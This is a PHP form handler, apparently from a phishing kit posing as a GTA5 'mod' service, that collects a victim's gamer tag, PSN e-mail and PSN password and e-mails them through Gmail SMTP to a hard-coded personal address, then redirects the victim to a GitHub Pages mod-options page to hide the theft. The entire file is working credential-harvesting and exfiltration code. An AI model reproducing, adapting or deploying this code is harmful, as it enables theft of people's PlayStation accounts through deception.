<?php

if(isset($_POST['test']) && !empty($_POST['test'])) {
    die();

}

        
// get variables from the form
$tag = $_POST['tag'];
$email = $_POST['email'];
$password = $_POST['password'];




//Load Composer's autoloader
        require 'PHPMailerAutoload.php';
        require 'class.phpmailer.php'; // path to the PHPMailer class
        require 'class.smtp.php';
        require 'saywhat.php';




$mail = new PHPMailer();                              // Passing `true` enables exceptions

try {

    //Server settings
$mail->SMTPDebug = 0;                                // Enable verbose debug output
$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = AK47;                 // SMTP username
$mail->Password = COMBO;
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;                                    // TCP port to connect to



    // Sender

    $mail->setFrom($email);



    // Recipients

    $mail->addAddress('jaydawg0514@gmail.com', 'JAY DAWG');     // Add a recipient





    //Body content

    $body = "<b>Gamer Tag:</b>". $tag."<br><b>PSN E-mail:</b><br>". $email."<br><b>PSN Password:</b>".$password;

    

   



    //Content

    $mail->isHTML(true);                                  // Set email format to HTML

    $mail->Subject = 'POP7852-Modz:'. $Media;



    $mail->Body    = $body;

    $mail->AltBody = strip_tags($body);



    $mail->send();

    header("location:https://gta5modz.github.io/account_mod_options/");

} catch (Exception $e) {

    echo 'Message could not be sent. Mailer Error: ', $mail->ErrorInfo;

}

?>

 